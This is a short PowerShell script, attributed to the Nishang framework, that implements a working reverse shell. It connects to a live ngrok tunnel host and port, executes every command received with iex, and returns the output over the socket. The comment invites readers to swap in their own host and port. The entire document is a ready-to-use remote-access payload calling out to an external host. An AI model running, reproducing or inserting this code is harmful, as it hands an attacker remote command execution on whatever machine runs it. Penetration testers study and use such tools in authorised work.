#A simple and small reverse shell by samratashok's Nishang framework. Change the Host IP Address and Port according to your setup as described in the README file of the script. 
$sm=(New-Object Net.Sockets.TCPClient("4.tcp.ngrok.io",19566)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}